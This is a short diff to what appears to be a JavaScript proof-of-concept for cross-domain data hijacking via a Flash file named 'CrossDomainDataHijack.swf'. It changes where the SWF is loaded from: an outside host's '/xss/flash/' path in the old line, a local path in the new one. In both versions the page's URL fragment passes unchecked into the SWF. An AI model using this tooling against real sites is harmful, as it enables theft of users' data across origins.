@@ -55,4 +55,4 @@ var crossdomain = {
     }
 };
 sendToJavaScript = crossdomain.callback;
-crossdomain.create('//www.olivierbeg.nl/xss/flash/CrossDomainDataHijack.swf?input=' + location.hash.substr(1));
+crossdomain.create('CrossDomainDataHijack.swf?input=' + location.hash.substr(1));
